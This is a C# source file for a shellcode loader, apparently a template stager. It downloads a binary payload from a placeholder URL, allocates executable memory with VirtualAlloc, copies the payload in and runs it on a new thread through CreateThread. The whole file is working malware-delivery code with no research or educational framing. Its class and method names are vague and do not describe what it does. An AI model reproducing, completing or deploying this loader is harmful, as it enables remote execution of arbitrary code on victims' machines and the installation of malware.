
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RemoteRequestbin
{
    public class pElid
    {
        private static readonly HttpClient client = new HttpClient();
        public static string Url = "%UURRLL%";
        public static async Task<byte[]> RequestBinAsync(string url)
        {
            try
            {
                byte[] responseData = await client.GetByteArrayAsync(url);
                return responseData;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred: {ex.Message}");
                return null; // 或者根据你的错误处理策略返回一个适当的值
            }
        }

      
        public void RunCode(byte[] shellcode)
        {

            IntPtr addr = Win32.VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);
            IntPtr hThread = Win32.CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            Win32.WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
        
        public async Task HowEver()
        {
            try
            {
                byte[] buf = RequestBinAsync(Url).Result;
                RunCode(buf);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }
    }

   
    public class Win32
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    }

}
